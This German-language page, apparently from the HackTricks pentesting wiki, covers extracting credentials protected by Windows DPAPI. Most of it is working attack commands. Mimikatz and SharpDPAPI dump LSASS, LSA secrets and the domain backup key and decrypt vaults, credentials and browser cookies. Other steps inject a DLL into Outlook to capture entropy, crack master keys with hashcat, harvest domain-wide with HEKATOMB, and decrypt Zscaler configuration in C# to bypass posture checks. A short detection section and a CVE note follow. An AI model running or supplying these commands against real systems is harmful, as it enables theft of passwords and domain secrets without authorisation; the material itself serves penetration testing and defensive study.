# DPAPI - Passwörter extrahieren

{{#include ../../banners/hacktricks-training.md}}



## Was ist DPAPI

Die Data Protection API (DPAPI) wird hauptsächlich im Windows-Betriebssystem für die **symmetrische Verschlüsselung asymmetrischer privater Schlüssel** verwendet, wobei entweder Benutzer- oder Systemgeheimnisse als bedeutende Entropiequelle dienen. Dieser Ansatz vereinfacht die Verschlüsselung für Entwickler, indem er ihnen ermöglicht, Daten mit einem Schlüssel zu verschlüsseln, der aus den Anmeldegeheimnissen des Benutzers oder, bei der Systemverschlüsselung, den Authentifizierungsgeheimnissen der Domäne des Systems abgeleitet wird, wodurch die Notwendigkeit entfällt, dass Entwickler den Schutz des Verschlüsselungsschlüssels selbst verwalten müssen.

Die gebräuchlichste Methode zur Verwendung von DPAPI erfolgt über die **`CryptProtectData` und `CryptUnprotectData`** Funktionen, die es Anwendungen ermöglichen, Daten sicher mit der Sitzung des Prozesses zu verschlüsseln und zu entschlüsseln, der derzeit angemeldet ist. Das bedeutet, dass die verschlüsselten Daten nur von demselben Benutzer oder System entschlüsselt werden können, das sie verschlüsselt hat.

Darüber hinaus akzeptieren diese Funktionen auch einen **`entropy` Parameter**, der ebenfalls während der Verschlüsselung und Entschlüsselung verwendet wird. Daher müssen Sie, um etwas zu entschlüsseln, das mit diesem Parameter verschlüsselt wurde, den gleichen Entropiewert angeben, der während der Verschlüsselung verwendet wurde.

### Schlüsselgenerierung für Benutzer

Die DPAPI generiert einen einzigartigen Schlüssel (genannt **`pre-key`**) für jeden Benutzer basierend auf deren Anmeldeinformationen. Dieser Schlüssel wird aus dem Passwort des Benutzers und anderen Faktoren abgeleitet, und der Algorithmus hängt vom Typ des Benutzers ab, endet aber als SHA1. Zum Beispiel hängt es für Domänenbenutzer von dem HTLM-Hash des Benutzers ab.

Dies ist besonders interessant, da ein Angreifer, der den Passwort-Hash des Benutzers erlangen kann, Folgendes tun kann:

- **Jede Daten entschlüsseln, die mit DPAPI** mit dem Schlüssel dieses Benutzers verschlüsselt wurde, ohne eine API kontaktieren zu müssen
- Versuchen, das **Passwort offline zu knacken**, indem er versucht, den gültigen DPAPI-Schlüssel zu generieren

Darüber hinaus wird jedes Mal, wenn ein Benutzer Daten mit DPAPI verschlüsselt, ein neuer **Master-Schlüssel** generiert. Dieser Master-Schlüssel ist derjenige, der tatsächlich zur Verschlüsselung von Daten verwendet wird. Jeder Master-Schlüssel wird mit einer **GUID** (Globally Unique Identifier) versehen, die ihn identifiziert.

Die Master-Schlüssel werden im **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`** Verzeichnis gespeichert, wobei `{SID}` der Sicherheitsbezeichner dieses Benutzers ist. Der Master-Schlüssel wird verschlüsselt mit dem **`pre-key`** des Benutzers und auch mit einem **Domänen-Backup-Schlüssel** zur Wiederherstellung gespeichert (d.h. derselbe Schlüssel wird zweimal mit 2 verschiedenen Passwörtern verschlüsselt gespeichert).

Beachten Sie, dass der **Domänenschlüssel, der zur Verschlüsselung des Master-Schlüssels verwendet wird, sich auf den Domänencontrollern befindet und sich niemals ändert**, sodass ein Angreifer, der Zugriff auf den Domänencontroller hat, den Domänen-Backup-Schlüssel abrufen und die Master-Schlüssel aller Benutzer in der Domäne entschlüsseln kann.

Die verschlüsselten Blobs enthalten die **GUID des Master-Schlüssels**, der zur Verschlüsselung der Daten in seinen Headern verwendet wurde.

> [!TIP]
> DPAPI-verschlüsselte Blobs beginnen mit **`01 00 00 00`**

Master-Schlüssel finden:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
Dies ist, wie eine Reihe von Master Keys eines Benutzers aussehen wird:

![](<../../images/image (1121).png>)

### Maschinen-/Systemschlüsselgenerierung

Dies ist der Schlüssel, der von der Maschine verwendet wird, um Daten zu verschlüsseln. Er basiert auf dem **DPAPI_SYSTEM LSA-Geheimnis**, das ein spezieller Schlüssel ist, auf den nur der SYSTEM-Benutzer zugreifen kann. Dieser Schlüssel wird verwendet, um Daten zu verschlüsseln, die vom System selbst zugänglich sein müssen, wie z. B. maschinenbezogene Anmeldeinformationen oder systemweite Geheimnisse.

Beachten Sie, dass diese Schlüssel **kein Domänen-Backup haben**, sodass sie nur lokal zugänglich sind:

- **Mimikatz** kann darauf zugreifen, indem es LSA-Geheimnisse mit dem Befehl: `mimikatz lsadump::secrets` dumpet.
- Das Geheimnis wird in der Registrierung gespeichert, sodass ein Administrator **die DACL-Berechtigungen ändern könnte, um darauf zuzugreifen**. Der Registrierungspfad ist: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`

### Geschützte Daten durch DPAPI

Zu den persönlichen Daten, die durch DPAPI geschützt sind, gehören:

- Windows-Anmeldeinformationen
- Passwörter und Auto-Vervollständigungsdaten von Internet Explorer und Google Chrome
- E-Mail- und interne FTP-Konto-Passwörter für Anwendungen wie Outlook und Windows Mail
- Passwörter für freigegebene Ordner, Ressourcen, drahtlose Netzwerke und Windows Vault, einschließlich Verschlüsselungsschlüssel
- Passwörter für Remote-Desktop-Verbindungen, .NET Passport und private Schlüssel für verschiedene Verschlüsselungs- und Authentifizierungszwecke
- Netzwerkpasswörter, die vom Credential Manager verwaltet werden, und persönliche Daten in Anwendungen, die CryptProtectData verwenden, wie Skype, MSN Messenger und mehr
- Verschlüsselte Blobs in der Registrierung
- ...

Systemgeschützte Daten umfassen:
- Wifi-Passwörter
- Passwörter für geplante Aufgaben
- ...

### Optionen zur Extraktion des Master-Schlüssels

- Wenn der Benutzer über Domänen-Administratorrechte verfügt, kann er auf den **Domänen-Backup-Schlüssel** zugreifen, um alle Benutzer-Master-Schlüssel in der Domäne zu entschlüsseln:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- Mit lokalen Administratorrechten ist es möglich, den **LSASS-Speicher** zuzugreifen, um die DPAPI-Master-Schlüssel aller verbundenen Benutzer und den SYSTEM-Schlüssel zu extrahieren.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- Wenn der Benutzer lokale Administratorrechte hat, kann er auf das **DPAPI_SYSTEM LSA-Geheimnis** zugreifen, um die Maschinen-Master-Schlüssel zu entschlüsseln:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- Wenn das Passwort oder der NTLM-Hash des Benutzers bekannt ist, können Sie **die Master-Schlüssel des Benutzers direkt entschlüsseln**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- Wenn Sie sich in einer Sitzung als der Benutzer befinden, ist es möglich, den DC nach dem **Backup-Schlüssel zur Entschlüsselung der Master-Schlüssel über RPC** zu fragen. Wenn Sie lokaler Administrator sind und der Benutzer angemeldet ist, könnten Sie **sein Sitzungstoken stehlen** dafür:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Liste Vault
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Zugriff auf DPAPI-verschlüsselte Daten

### Finden Sie DPAPI-verschlüsselte Daten

Häufig geschützte **Dateien** von Benutzern befinden sich in:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Überprüfen Sie auch, ob Sie `\Roaming\` in den obigen Pfaden durch `\Local\` ersetzen. 

Beispiele zur Enumeration:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) kann DPAPI-verschlüsselte Blobs im Dateisystem, in der Registrierung und in B64-Blobs finden:
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
Beachten Sie, dass [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (aus demselben Repository) verwendet werden kann, um mit DPAPI sensible Daten wie Cookies zu entschlüsseln.

### Zugriffsschlüssel und Daten

- **Verwenden Sie SharpDPAPI**, um Anmeldeinformationen aus DPAPI-verschlüsselten Dateien der aktuellen Sitzung zu erhalten:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **Holen Sie sich Anmeldeinformationen** wie die verschlüsselten Daten und den guidMasterKey.
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Zugriff auf Masterkeys**:

Entschlüsseln Sie einen Masterkey eines Benutzers, der den **Domain-Backup-Schlüssel** über RPC anfordert:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
Das **SharpDPAPI**-Tool unterstützt auch diese Argumente zur Entschlüsselung des Masterkeys (beachten Sie, dass es möglich ist, `/rpc` zu verwenden, um den Backup-Schlüssel der Domäne zu erhalten, `/password`, um ein Klartextpasswort zu verwenden, oder `/pvk`, um eine DPAPI-Domänen-Privatschlüsseldatei anzugeben...):
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **Daten mit einem Masterkey entschlüsseln**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
Das **SharpDPAPI**-Tool unterstützt auch diese Argumente für die `credentials|vaults|rdg|keepass|triage|blob|ps`-Entschlüsselung (beachten Sie, wie es möglich ist, `/rpc` zu verwenden, um den Backup-Schlüssel der Domäne zu erhalten, `/password`, um ein Klartextpasswort zu verwenden, `/pvk`, um eine DPAPI-Domänen-Privatschlüsseldatei anzugeben, `/unprotect`, um die Sitzung des aktuellen Benutzers zu verwenden...):
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- Entschlüsseln Sie einige Daten mit **der aktuellen Benutzersitzung**:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---
### Umgang mit optionaler Entropie ("Drittanbieter-Entropie")

Einige Anwendungen übergeben einen zusätzlichen **Entropie**-Wert an `CryptProtectData`. Ohne diesen Wert kann der Blob nicht entschlüsselt werden, selbst wenn der richtige Masterkey bekannt ist. Das Erlangen der Entropie ist daher entscheidend, wenn Anmeldeinformationen, die auf diese Weise geschützt sind, ins Visier genommen werden (z. B. Microsoft Outlook, einige VPN-Clients).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) ist eine Benutzermodus-DLL, die die DPAPI-Funktionen im Zielprozess hookt und transparent jede optionale Entropie aufzeichnet, die bereitgestellt wird. Das Ausführen von EntropyCapture im **DLL-Injection**-Modus gegen Prozesse wie `outlook.exe` oder `vpnclient.exe` gibt eine Datei aus, die jeden Entropie-Puffer dem aufrufenden Prozess und Blob zuordnet. Die erfasste Entropie kann später an **SharpDPAPI** (`/entropy:`) oder **Mimikatz** (`/entropy:<file>`) übergeben werden, um die Daten zu entschlüsseln.
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Cracking masterkeys offline (Hashcat & DPAPISnoop)

Microsoft führte ein **context 3** masterkey-Format mit Windows 10 v1607 (2016) ein. `hashcat` v6.2.6 (Dezember 2023) fügte die Hash-Modi **22100** (DPAPI masterkey v1 context), **22101** (context 1) und **22102** (context 3) hinzu, die GPU-beschleunigtes Knacken von Benutzerpasswörtern direkt aus der masterkey-Datei ermöglichen. Angreifer können daher Wörterbuch- oder Brute-Force-Angriffe durchführen, ohne mit dem Zielsystem zu interagieren.

`DPAPISnoop` (2024) automatisiert den Prozess:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
Das Tool kann auch Credential- und Vault-Blobs parsen, sie mit geknackten Schlüsseln entschlüsseln und Klartext-Passwörter exportieren.

### Zugriff auf Daten anderer Maschinen

In **SharpDPAPI und SharpChrome** können Sie die **`/server:HOST`**-Option angeben, um auf die Daten einer Remote-Maschine zuzugreifen. Natürlich müssen Sie in der Lage sein, auf diese Maschine zuzugreifen, und im folgenden Beispiel wird angenommen, dass der **Domain-Backup-Verschlüsselungsschlüssel bekannt ist**:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## Andere Werkzeuge

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) ist ein Tool, das die Extraktion aller Benutzer und Computer aus dem LDAP-Verzeichnis sowie die Extraktion des Backup-Schlüssels des Domänencontrollers über RPC automatisiert. Das Skript wird dann die IP-Adressen aller Computer auflösen und einen smbclient auf allen Computern ausführen, um alle DPAPI-Blobs aller Benutzer abzurufen und alles mit dem Domänen-Backup-Schlüssel zu entschlüsseln.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Mit der aus der LDAP-Computerliste extrahierten Liste können Sie jedes Subnetz finden, selbst wenn Sie es nicht kannten!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) kann automatisch durch DPAPI geschützte Geheimnisse dumpen. Die Version 2.x führte ein:

* Parallele Sammlung von Blobs von Hunderten von Hosts
* Parsing von **context 3** Masterkeys und automatische Hashcat-Cracking-Integration
* Unterstützung für Chrome "App-Bound" verschlüsselte Cookies (siehe nächsten Abschnitt)
* Ein neuer **`--snapshot`** Modus, um Endpunkte wiederholt abzufragen und neu erstellte Blobs zu vergleichen

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) ist ein C#-Parser für Masterkey-/Credential-/Vault-Dateien, der Hashcat/JtR-Formate ausgeben und optional das Cracking automatisch auslösen kann. Es unterstützt vollständig Maschinen- und Benutzer-Masterkey-Formate bis Windows 11 24H1.


## Häufige Erkennungen

- Zugriff auf Dateien in `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` und anderen DPAPI-bezogenen Verzeichnissen.
- Besonders von einem Netzwerkfreigabe wie **C$** oder **ADMIN$**.
- Verwendung von **Mimikatz**, **SharpDPAPI** oder ähnlichen Werkzeugen, um auf den LSASS-Speicher zuzugreifen oder Masterkeys zu dumpen.
- Ereignis **4662**: *Eine Operation wurde an einem Objekt durchgeführt* – kann mit dem Zugriff auf das **`BCKUPKEY`**-Objekt korreliert werden.
- Ereignis **4673/4674**, wenn ein Prozess *SeTrustedCredManAccessPrivilege* (Credential Manager) anfordert.

---
### 2023-2025 Schwachstellen & Änderungen im Ökosystem

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (November 2023). Ein Angreifer mit Netzwerkzugang könnte ein Domänenmitglied dazu bringen, einen bösartigen DPAPI-Backup-Schlüssel abzurufen, was die Entschlüsselung von Benutzer-Masterkeys ermöglicht. Im November 2023 in einem kumulativen Update gepatcht – Administratoren sollten sicherstellen, dass DCs und Arbeitsstationen vollständig gepatcht sind.
* **Chrome 127 “App-Bound” Cookie-Verschlüsselung** (Juli 2024) ersetzte den legacy DPAPI-only Schutz durch einen zusätzlichen Schlüssel, der im **Credential Manager** des Benutzers gespeichert ist. Die Offline-Entschlüsselung von Cookies erfordert jetzt sowohl den DPAPI-Masterkey als auch den **GCM-umwickelten app-bound key**. SharpChrome v2.3 und DonPAPI 2.x können den zusätzlichen Schlüssel wiederherstellen, wenn sie im Benutzerkontext ausgeführt werden.


### Fallstudie: Zscaler Client Connector – Benutzerdefinierte Entropie, die aus SID abgeleitet ist

Zscaler Client Connector speichert mehrere Konfigurationsdateien unter `C:\ProgramData\Zscaler` (z. B. `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Jede Datei ist mit **DPAPI (Maschinenscope)** verschlüsselt, aber der Anbieter liefert **benutzerdefinierte Entropie**, die *zur Laufzeit berechnet* wird, anstatt auf der Festplatte gespeichert zu werden.

Die Entropie wird aus zwei Elementen wiederhergestellt:

1. Ein hartcodiertes Geheimnis, das in `ZSACredentialProvider.dll` eingebettet ist.
2. Die **SID** des Windows-Kontos, zu dem die Konfiguration gehört.

Der von der DLL implementierte Algorithmus entspricht:
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
Weil das Geheimnis in einer DLL eingebettet ist, die vom Datenträger gelesen werden kann, **kann jeder lokale Angreifer mit SYSTEM-Rechten die Entropie für jede SID regenerieren** und die Blobs offline entschlüsseln:
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
Die Entschlüsselung ergibt die vollständige JSON-Konfiguration, einschließlich jeder **Geräte-Posture-Prüfung** und ihres erwarteten Wertes – Informationen, die sehr wertvoll sind, wenn man versucht, clientseitige Umgehungen durchzuführen.

> TIP: Die anderen verschlüsselten Artefakte (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) sind mit DPAPI **ohne** Entropie (`16` Null-Bytes) geschützt. Sie können daher direkt mit `ProtectedData.Unprotect` entschlüsselt werden, sobald SYSTEM-Rechte erlangt werden.

## References

- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)

- [https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [https://github.com/Leftp/DPAPISnoop](https://github.com/Leftp/DPAPISnoop)
- [https://pypi.org/project/donpapi/2.0.0/](https://pypi.org/project/donpapi/2.0.0/)

{{#include ../../banners/hacktricks-training.md}}
